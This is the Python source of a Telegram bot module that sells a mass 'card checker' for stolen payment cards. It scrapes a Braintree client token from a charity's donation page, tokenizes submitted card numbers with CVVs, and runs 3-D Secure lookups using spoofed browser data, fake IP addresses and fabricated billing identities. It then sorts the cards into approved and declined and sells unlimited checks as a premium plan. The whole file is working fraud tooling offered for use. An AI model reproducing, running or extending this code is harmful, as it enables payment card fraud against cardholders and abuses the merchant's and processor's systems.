"""
Braintree VBV 3DS2 Mass Checker
Command: /mvbv
Type: Mass Charge
Limits: Free: 10 | Premium: Unlimited
"""

from aiogram import Router, F, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, FSInputFile
import asyncio
import time
import logging
import os
import re
import random
import requests
import json
import base64
import io
from datetime import datetime
from faker import Faker

from database import get_user_credits, update_credits, get_user
from sub import get_premium_status
from bin import get_bin_info
from mass_gates.card_cleaner import clean_cards, mask_card

router = Router()
fake = Faker()

GATE_NAME = "Braintree VBV 3DS2"
GATE_CMD = "mvbv"
active_sessions = {}

# Braintree VBV specific constants
SITE_URL = "https://cllsupport.org.uk"
DONATE_URL = f"{SITE_URL}/donate/"
BRAINTREE_GRAPHQL = "https://payments.braintree-api.com/graphql"
BRAINTREE_API = "https://api.braintreegateway.com"

STATUS_MAP = {
    "authenticate_successful": "APPROVED",
    "authenticate_attempt_successful": "APPROVED",
    "challenge_required": "3DS_REQUIRED",
    "authenticate_frictionless_failed": "3DS_REQUIRED",
    "lookup_card_error": "DECLINED",
    "authenticate_rejected": "DECLINED",
    "lookup_error": "ERROR",
    "authenticate_unavailable": "DECLINED",
    "authenticate_error": "ERROR",
    "no_response": "ERROR",
}

APPROVED_KEYWORDS = [
    "authenticate_successful", "authenticate_attempt_successful",
    "approved", "success", "charged", "completed", "authorized"
]

def is_approved_response(text: str) -> bool:
    text_lower = text.lower()
    for keyword in APPROVED_KEYWORDS:
        if keyword in text_lower:
            return True
    return False

def fb(text):
    bold_map = {
        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛',
        'I': '𝗜', 'J': '𝗝', 'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣',
        'Q': '𝗤', 'R': '𝗥', 'S': '𝗦', 'T': '𝗧', 'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫',
        'Y': '𝗬', 'Z': '𝗭',
        'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵',
        'i': '𝗶', 'j': '𝗷', 'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽',
        'q': '𝗾', 'r': '𝗿', 's': '𝘀', 't': '𝘁', 'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅',
        'y': '𝘆', 'z': '𝘇',
        '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰', '5': '𝟱', '6': '𝟲', '7': '𝟳',
        '8': '𝟴', '9': '𝟵',
        ' ': ' ', '.': '.', ':': ':', '|': '|', '/': '/', '-': '-', '_': '_',
        '(': '(', ')': ')', '[': '[', ']': ']', '{': '{', '}': '}', '<': '<', '>': '>',
        '!': '!', '?': '?', ',': ',', ';': ';', '+': '+', '=': '=', '*': '*', '&': '&',
        '%': '%', '#': '#', '@': '@', '$': '$', '^': '^', '~': '~', '`': '`',
    }
    return ''.join(bold_map.get(c, c) for c in text)

def bold_font(text):
    return fb(text)

def get_bin_data(bin_num):
    try:
        resp = requests.get(f'https://lookup.binlist.net/{bin_num}', timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return {
                'bank': data.get('bank', {}).get('name', 'Unknown'),
                'country': data.get('country', {}).get('name', 'Unknown'),
                'emoji': data.get('country', {}).get('emoji', ''),
                'brand': data.get('scheme', 'Unknown'),
                'type': data.get('type', 'Unknown'),
            }
    except:
        pass
    return {'bank': 'Unknown', 'country': 'Unknown', 'emoji': '', 'brand': 'Unknown', 'type': 'Unknown'}

def extract_auth(session):
    try:
        r = session.get(DONATE_URL, timeout=20)
        m = re.search(r'name="clientToken"\s+value="([^"]+)"', r.text)
        if not m:
            m = re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', r.text)
        if m:
            token_b64 = m.group(1)
            decoded = base64.b64decode(token_b64).decode("utf-8")
            data = json.loads(decoded)
            auth = data.get("authorizationFingerprint", "")
            merch = data.get("merchantId", "")
            if auth and merch:
                return auth, merch
        return None, None
    except:
        return None, None

def tokenize_card(session, auth, cc, mm, yy, cvv):
    if len(yy) == 2:
        yy = "20" + yy
    query = """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
        tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } }
    }"""
    variables = {
        "input": {
            "creditCard": {
                "number": cc,
                "expirationMonth": mm,
                "expirationYear": yy,
                "cvv": cvv,
            },
            "options": {"validate": False},
        }
    }
    headers = {
        "User-Agent": fake.user_agent(),
        "Accept": "application/json",
        "Authorization": f"Bearer {auth}",
        "Braintree-Version": "2018-05-10",
        "Content-Type": "application/json",
    }
    body = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(fake.uuid4()),
        },
        "query": query,
        "variables": variables,
        "operationName": "TokenizeCreditCard",
    }
    resp = session.post(BRAINTREE_GRAPHQL, headers=headers, json=body, timeout=30)
    data = resp.json()
    if "errors" in data:
        err_msg = data["errors"][0].get("message", "Unknown")
        return None, None, None, err_msg
    token = data["data"]["tokenizeCreditCard"]["token"]
    card_info = data["data"]["tokenizeCreditCard"]["creditCard"]
    return token, card_info.get("last4", ""), card_info.get("brandCode", "VISA"), None

def lookup_3ds(session, auth, merch, token, cc):
    url = f"{BRAINTREE_API}/merchants/{merch}/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
    payload = {
        "amount": "1.00",
        "browserColorDepth": 24,
        "browserJavaEnabled": False,
        "browserJavascriptEnabled": True,
        "browserLanguage": "en-GB",
        "browserScreenHeight": 800,
        "browserScreenWidth": 360,
        "browserTimeZone": -345,
        "deviceChannel": "Browser",
        "additionalInfo": {
            "ipAddress": fake.ipv4(),
            "billingLine1": "New York",
            "billingCity": "New York",
            "billingState": "NY",
            "billingPostalCode": "10080",
            "billingCountryCode": "US",
            "billingPhoneNumber": "998773772",
            "billingGivenName": "John",
            "billingSurname": "Doe",
            "email": f"john{random.randint(100, 999)}@gmail.com",
        },
        "bin": cc[:6],
        "dfReferenceId": f"0_{fake.uuid4()}",
        "clientMetadata": {
            "requestedThreeDSecureVersion": "2",
            "sdkVersion": "web/3.115.1",
            "cardinalDeviceDataCollectionTimeElapsed": random.randint(400, 2000),
            "issuerDeviceDataCollectionTimeElapsed": random.randint(800, 5000),
            "issuerDeviceDataCollectionResult": True,
        },
        "authorizationFingerprint": auth,
        "braintreeLibraryVersion": "braintree/web/3.115.1",
        "_meta": {
            "merchantAppId": "cllsupport.org.uk",
            "platform": "web",
            "sdkVersion": "3.115.1",
            "source": "client",
            "integration": "custom",
            "integrationType": "custom",
            "sessionId": str(fake.uuid4()),
        },
    }
    resp = session.post(url, headers={"User-Agent": fake.user_agent(), "Accept": "application/json", "Content-Type": "application/json"}, json=payload, timeout=45)
    if resp.status_code in [200, 201] and resp.text.strip():
        return resp.json()
    return {}

def parse_status(lookup):
    try:
        return lookup["paymentMethod"]["threeDSecureInfo"]["status"]
    except:
        lookup_str = json.dumps(lookup)
        for code in STATUS_MAP:
            if code in lookup_str:
                return code
    return "no_response"

def get_enrolled(lookup, result_code):
    try:
        enrolled_raw = lookup["paymentMethod"]["threeDSecureInfo"]["enrolled"]
        if enrolled_raw == "Y":
            return "ENROLLED"
        if enrolled_raw == "N":
            return "NOT_ENROLLED"
        if enrolled_raw == "U":
            return "UNKNOWN"
    except:
        pass
    enrolled_map = {
        "authenticate_successful": "ENROLLED",
        "authenticate_attempt_successful": "ENROLLED",
        "challenge_required": "ENROLLED",
        "authenticate_frictionless_failed": "ENROLLED",
        "lookup_card_error": "NOT_ENROLLED",
        "authenticate_rejected": "NOT_ENROLLED",
        "lookup_error": "NOT_ENROLLED",
        "authenticate_unavailable": "NOT_ENROLLED",
        "authenticate_error": "NOT_ENROLLED",
        "no_response": "UNKNOWN",
    }
    return enrolled_map.get(result_code, "UNKNOWN")

def process_single_card(card, session, auth, merch):
    parts = card.strip().replace('/', '|').split('|')
    if len(parts) < 4:
        return {"status": "ERROR", "response": "INVALID_FORMAT"}
    
    cc = parts[0].strip()
    mm = parts[1].strip().zfill(2)
    yy = parts[2].strip()
    cvv = parts[3].strip()
    
    token, last4, brand, err = tokenize_card(session, auth, cc, mm, yy, cvv)
    if not token:
        return {"status": "ERROR", "response": err or "TOKEN_FAILED"}
    
    lookup = lookup_3ds(session, auth, merch, token, cc)
    result_code = parse_status(lookup)
    status = STATUS_MAP.get(result_code, "UNKNOWN")
    enrolled = get_enrolled(lookup, result_code)
    
    return {
        "status": status,
        "response": f"{result_code} | Enrolled: {enrolled}",
        "brand": brand,
        "last4": last4,
        "enrolled": enrolled
    }

def get_buy_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 𝗕𝗨𝗬 𝗡𝗢𝗪", url="https://t.me/npnbit4")]
    ])

def build_live_message(session_data):
    total = session_data['total']
    checked = session_data['checked']
    approved = session_data['approved']
    declined = session_data['declined']
    errors = session_data['errors']
    threeds = session_data.get('threeds', 0)
    workers = session_data.get('workers', 5)
    current_card = session_data.get('current_card', '')
    current_response = session_data.get('current_response', '')
    current_status = session_data.get('current_status', '')
    plan = session_data.get('plan', 'TRIAL')
    
    pct = int((checked / total) * 100) if total > 0 else 0
    
    if current_status == "APPROVED":
        status_display = f"✅ {bold_font('APPROVED')}"
    elif current_status == "3DS_REQUIRED":
        status_display = f"🔐 {bold_font('3DS REQUIRED')}"
    elif current_status == "DECLINED":
        status_display = f"❌ {bold_font('DECLINED')}"
    elif current_status == "ERROR":
        status_display = f"⚠️ {bold_font('ERROR')}"
    else:
        status_display = f"⏳ {bold_font('Checking...')}"
    
    display_card = mask_card(current_card) if current_card else "—"
    
    text = (
        f"{bold_font(f'[#] {GATE_NAME} ↦ Live ↦ ★')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold_font('[#] Total ↦')} {total:,}\n"
        f"{bold_font('[#] Checked ↦')} {checked:,}\n"
        f"{bold_font('[#] Approved ↦')} {approved}\n"
        f"{bold_font('[#] 3DS ↦')} {threeds}\n"
        f"{bold_font('[#] Declined ↦')} {declined}\n"
        f"{bold_font('[#] Errors ↦')} {errors}\n"
        f"{bold_font('[#] Workers ↦')} {workers}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold_font(f'{pct}%')} | {checked:,} / {total:,}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold_font('Card:')} {display_card}\n"
        f"{bold_font('Status:')} {status_display}\n"
        f"{bold_font('Response:')} {current_response or '—'}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold_font('Plan:')} {plan}\n"
    )
    
    if current_response and current_response != '—':
        response_button = InlineKeyboardButton(
            text=f"📝 {bold_font('Response')} — {current_response[:35]}{'...' if len(current_response)>35 else ''}",
            callback_data=f"{GATE_CMD}_response_{session_data['user_id']}"
        )
        card_button = InlineKeyboardButton(
            text=f"💳 {display_card}",
            callback_data=f"{GATE_CMD}_card_{session_data['user_id']}"
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [card_button],
            [response_button],
            [InlineKeyboardButton(text=f"⏸️ {bold_font('Pause')}", callback_data=f"{GATE_CMD}_pause_{session_data['user_id']}"),
             InlineKeyboardButton(text=f"🛑 {bold_font('Stop')}", callback_data=f"{GATE_CMD}_stop_{session_data['user_id']}")]
        ])
    else:
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"⏸️ {bold_font('Pause')}", callback_data=f"{GATE_CMD}_pause_{session_data['user_id']}"),
             InlineKeyboardButton(text=f"🛑 {bold_font('Stop')}", callback_data=f"{GATE_CMD}_stop_{session_data['user_id']}")]
        ])
    
    return text, kb

@router.message(Command("mvbv"))
async def mvbv_command(message: types.Message):
    user_id = message.from_user.id
    raw_cards = []
    
    args = message.text.split(maxsplit=1)
    if len(args) > 1:
        raw_cards = clean_cards(args[1])
    
    if not raw_cards and message.reply_to_message:
        reply = message.reply_to_message
        if reply.document:
            try:
                file_id = reply.document.file_id
                file_info = await message.bot.get_file(file_id)
                downloaded = await message.bot.download_file(file_info.file_path)
                content = downloaded.read().decode('utf-8')
                raw_cards = clean_cards(content)
            except Exception as e:
                await message.answer(f"❌ Error reading file: {str(e)}")
                return
        elif reply.text:
            raw_cards = clean_cards(reply.text)
    
    if not raw_cards:
        await message.answer(
            f"{bold_font(f'[#] {GATE_NAME} ↦ Help')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold_font('Usage:')}\n"
            f"1️⃣ Paste cards after /mvbv\n"
            f"2️⃣ Reply to .txt file\n"
            f"3️⃣ Reply to text message\n\n"
            f"{bold_font('Format:')}\n"
            f"<code>CC|MM|YY|CVV</code>\n\n"
            f"{bold_font('Limits:')}\n"
            f"┣ Free: 10 cards\n"
            f"┗ Premium: Unlimited",
            parse_mode="HTML")
        return
    
    if len(raw_cards) > 0:
        await message.answer(f"✅ Cleaned {len(raw_cards)} valid cards from your input.")
    
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    plan = "𝗣𝗥𝗘𝗠𝗜𝗨𝗠" if is_premium else "𝗧𝗥𝗜𝗔𝗟"
    limit = 10000 if is_premium else 10
    
    if len(raw_cards) > limit and not is_premium:
        await message.answer(
            f"⚠️ <b>𝗟𝗶𝗺𝗶𝘁 𝗥𝗲𝗮𝗰𝗵𝗲𝗱!</b>\n\n"
            f"📌 𝗙𝗿𝗲𝗲 𝘂𝘀𝗲𝗿𝘀 𝗰𝗮𝗻 𝗼𝗻𝗹𝘆 𝗰𝗵𝗲𝗰𝗸 𝟭𝟬 𝗰𝗮𝗿𝗱𝘀 𝗽𝗲𝗿 𝗺𝗮𝘀𝘀 𝗰𝗵𝗲𝗰𝗸.\n\n"
            f"💎 𝗨𝗽𝗴𝗿𝗮𝗱𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗳𝗼𝗿:\n"
            f"┣ ✅ 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗰𝗮𝗿𝗱𝘀\n"
            f"┣ ✅ 𝗙𝗮𝘀𝘁𝗲𝗿 𝗰𝗵𝗲𝗰𝗸𝗶𝗻𝗴\n"
            f"┣ ✅ 𝗔𝗹𝗹 𝗴𝗮𝘁𝗲𝘄𝗮𝘆𝘀\n"
            f"┗ ✅ 𝗡𝗼 𝗱𝗮𝗶𝗹𝘆 𝗹𝗶𝗺𝗶𝘁\n\n"
            f"📢 𝗖𝗼𝗻𝘁𝗮𝗰𝘁: @npnbit4",
            parse_mode="HTML"
        )
        raw_cards = raw_cards[:limit]
    
    # Initialize Braintree VBV session
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-GB,en;q=0.9",
    })
    
    auth, merch = extract_auth(session)
    if not auth:
        await message.answer("❌ Failed to extract Braintree auth. Site may be down.")
        return
    
    total = len(raw_cards)
    
    session_data = {
        'user_id': user_id,
        'cards': raw_cards,
        'total': total,
        'checked': 0,
        'approved': 0,
        'declined': 0,
        'errors': 0,
        'threeds': 0,
        'current_card': '',
        'current_response': '',
        'current_status': '',
        'workers': 5,
        'stop': False,
        'paused': False,
        'msg_id': None,
        'chat_id': message.chat.id,
        'approved_cards': [],
        'declined_cards': [],
        'error_cards': [],
        'original_message': message,
        'plan': plan,
        'start_time': time.time(),
        'braintree_session': session,
        'braintree_auth': auth,
        'braintree_merch': merch,
    }
    active_sessions[user_id] = session_data
    
    text, kb = build_live_message(session_data)
    msg = await message.answer(text, parse_mode="HTML", reply_markup=kb)
    session_data['msg_id'] = msg.message_id
    
    for idx, card in enumerate(raw_cards):
        if session_data.get('stop', False):
            break
        while session_data.get('paused', False):
            await asyncio.sleep(1)
            if session_data.get('stop', False):
                break
        
        session_data['current_card'] = card
        session_data['current_status'] = '⏳ Checking...'
        
        text, kb = build_live_message(session_data)
        try:
            await msg.edit_text(text, parse_mode="HTML", reply_markup=kb)
        except:
            pass
        
        result = process_single_card(card, session, auth, merch)
        
        session_data['checked'] += 1
        session_data['current_response'] = result.get('response', 'Unknown')
        session_data['current_status'] = result.get('status', 'UNKNOWN')
        
        status = result.get('status', 'UNKNOWN')
        if status == "APPROVED":
            session_data['approved'] += 1
            session_data['approved_cards'].append(f"{card} | {result.get('response', '')}")
            bin_data = get_bin_data(card[:6])
            user_link = f'<a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>'
            
            approved_msg = (
                f"𝗦𝘁𝗮𝘁𝘂𝘀 ➛ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅\n"
                f"𝗖𝗮𝗿𝗱 ➛ <code>{card}</code>\n"
                f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ {GATE_NAME}\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ <b>{result.get('response', '')}</b>\n"
                f"𝗕𝗿𝗮𝗻𝗱 ➛ {bin_data['brand']}\n"
                f"𝗜𝘀𝘀𝘂𝗲𝗿 ➛ {bin_data['bank']}\n"
                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ {bin_data['country']} {bin_data['emoji']}\n"
                f"𝗨𝘀𝗲𝗿 ➛ {user_link} ({plan})\n"
                f"𝗗𝗲𝘃 ➛ npnbit4"
            )
            await message.answer(approved_msg, parse_mode="HTML", reply_markup=get_buy_keyboard())
        elif status == "3DS_REQUIRED":
            session_data['threeds'] += 1
            session_data['declined_cards'].append(f"{card} | 3DS_REQUIRED")
        elif status == "DECLINED":
            session_data['declined'] += 1
            session_data['declined_cards'].append(f"{card} | {result.get('response', '')}")
        else:
            session_data['errors'] += 1
            session_data['error_cards'].append(f"{card} | {result.get('response', '')}")
        
        text, kb = build_live_message(session_data)
        try:
            await msg.edit_text(text, parse_mode="HTML", reply_markup=kb)
        except:
            pass
        
        await asyncio.sleep(random.uniform(3, 5))
    
    if not session_data.get('stop', False):
        text, kb = build_live_message(session_data)
        text += f"\n\n✅ {bold_font('Mass Check Complete!')}"
        try:
            await msg.edit_text(text, parse_mode="HTML", reply_markup=None)
        except:
            pass
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if session_data['approved_cards']:
            approved_txt = f"APPROVED_{timestamp}.txt"
            with open(approved_txt, "w", encoding="utf-8") as f:
                f.write(f"Approved Cards ({len(session_data['approved_cards'])} total):\n\n")
                f.write("\n".join(session_data['approved_cards']))
            await message.reply_document(
                document=FSInputFile(approved_txt),
                caption=f"✅ Approved: {len(session_data['approved_cards'])} cards"
            )
            os.remove(approved_txt)
        
        if session_data['declined_cards']:
            declined_txt = f"DECLINED_{timestamp}.txt"
            with open(declined_txt, "w", encoding="utf-8") as f:
                f.write(f"Declined Cards ({len(session_data['declined_cards'])} total):\n\n")
                f.write("\n".join(session_data['declined_cards']))
            await message.reply_document(
                document=FSInputFile(declined_txt),
                caption=f"❌ Declined: {len(session_data['declined_cards'])} cards"
            )
            os.remove(declined_txt)
        
        if session_data['error_cards']:
            error_txt = f"ERRORS_{timestamp}.txt"
            with open(error_txt, "w", encoding="utf-8") as f:
                f.write(f"Error Cards ({len(session_data['error_cards'])} total):\n\n")
                f.write("\n".join(session_data['error_cards']))
            await message.reply_document(
                document=FSInputFile(error_txt),
                caption=f"⚠️ Errors: {len(session_data['error_cards'])} cards"
            )
            os.remove(error_txt)
    
    active_sessions.pop(user_id, None)

@router.callback_query(F.data.startswith("mvbv_card_"))
async def mvbv_card_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
    session = active_sessions.get(user_id)
    if not session:
        await callback.answer("⚠️ No active session", show_alert=True)
        return
    card = session.get('current_card', 'No card')
    await callback.answer(f"📌 {card[:30]}...", show_alert=True)

@router.callback_query(F.data.startswith("mvbv_response_"))
async def mvbv_response_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
    session = active_sessions.get(user_id)
    if not session:
        await callback.answer("⚠️ No active session", show_alert=True)
        return
    response = session.get('current_response', 'No response')
    status = session.get('current_status', 'Unknown')
    await callback.answer(f"📊 {status}: {response[:60]}", show_alert=True)

@router.callback_query(F.data.startswith("mvbv_stop_"))
async def mvbv_stop_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
    if user_id in active_sessions:
        active_sessions[user_id]['stop'] = True
        await callback.answer("🛑 Stopping...", show_alert=True)
    else:
        await callback.answer("⚠️ No active session", show_alert=True)

@router.callback_query(F.data.startswith("mvbv_pause_"))
async def mvbv_pause_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
    session = active_sessions.get(user_id)
    if session:
        session['paused'] = not session.get('paused', False)
        status = "⏸️ Paused" if session['paused'] else "▶️ Resumed"
        await callback.answer(status, show_alert=True)
    else:
        await callback.answer("⚠️ No active session", show_alert=True)
